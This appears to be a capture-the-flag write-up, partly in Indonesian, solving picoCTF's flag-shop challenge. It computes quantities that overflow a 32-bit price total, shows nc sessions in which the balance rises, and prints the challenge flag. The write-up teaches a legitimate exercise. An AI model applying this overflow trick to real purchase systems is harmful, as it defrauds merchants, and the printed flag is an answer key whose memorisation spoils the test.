# soal
There's a flag shop selling stuff, can you buy a flag? Source. \
Connect with nc jupiter.challenges.picoctf.org 9745.

# hint
- Two's compliment can do some weird things when numbers get really big!

# solve
```bash
wget https://jupiter.challenges.picoctf.org/static/253c4651d852ac6342752ff222cf2a83/store.c
```

- INT_MAX = 2,147,483,647
- kita akan mencoba exploitasi integer overflow
- jika kita melihat codenya

## mengghitung int overflow
```bash
total_cost = 900*number_flags;
# number flags adalah nilai yang ingin dibeli pada pilihan 1, 1

# membuat nilai total cost ini menjadi negatif untuk bypass harga
# number_flags = (INT_MAX / 900)
# maka kita bisa membypass (total_cost <= account_balance)
# (-1811939327 <= account_balance)

## untuk mendapatkan angka yang sesuai kita bisa mencba menghitun terlebih dahulu

python3
INT_MAX = 2147483647
INT = (INT_MAX // 900) # ini adalah int yang dapat dimasukan sebelum melakukan int overflow

# nilai sebelum overflow
print(INT)
# 2386092

print(INT + 1) # maka nanti hasilnya akan melebihi overflow dan menjadi negative
# 2386093

print(INT * 10) # maka nantinya hasilnya akan melebihi overflow dan mendapatkan hasil positif
# 23860920

## dikarenakan kita butuh 100000 balance
## maka saya mencoba untuk mengalikan 150
print(INT * 150)
# 357913800
```

## exploit
```bash
# 2386092
## jika tidak ditambah maka akan menghasilkan angka sebelum overflow

nc jupiter.challenges.picoctf.org 9745
: 2, 1
# These knockoff Flags cost 900 each, enter desired quantity
2386092
## The final cost is: 2147482800

# 2386093
## jika ditambah 1 maka kita bisa mendapatkan angka negatif

nc jupiter.challenges.picoctf.org 9745
: 2, 1
# These knockoff Flags cost 900 each, enter desired quantity
2386093
# The final cost is: -2147483596
# Your current balance after transaction: -2147482600

# 23860920
## jika hasil sebelum overflow kita kalikan 10 kita bisa mendapatkan nilai positif

nc jupiter.challenges.picoctf.org 9745
: 2, 1
# These knockoff Flags cost 900 each, enter desired quantity
23860920
# The final cost is: -8480
# Your current balance after transaction: 9580

# 357913800
nc jupiter.challenges.picoctf.org 9745
: 2, 1
# These knockoff Flags cost 900 each, enter desired quantity
357913800
# The final cost is: -127200
# Your current balance after transaction: 128300
```

## get flag
```bash
nc jupiter.challenges.picoctf.org 9745
# 2, 1
357913800
# 2, 2
1
# YOUR FLAG IS: picoCTF{m0n3y_bag5_65d67a74}
```

- Ketika +1 digunakan, hasilnya hanya overflow sekali, sehingga langsung menjadi nilai negatif besar.
- Ketika *10 digunakan, hasilnya overflow berulang kali sehingga mencapai angka yang lebih kecil (positif atau negatif tergantung wrapping terakhir).

# flag
picoCTF{m0n3y_bag5_65d67a74}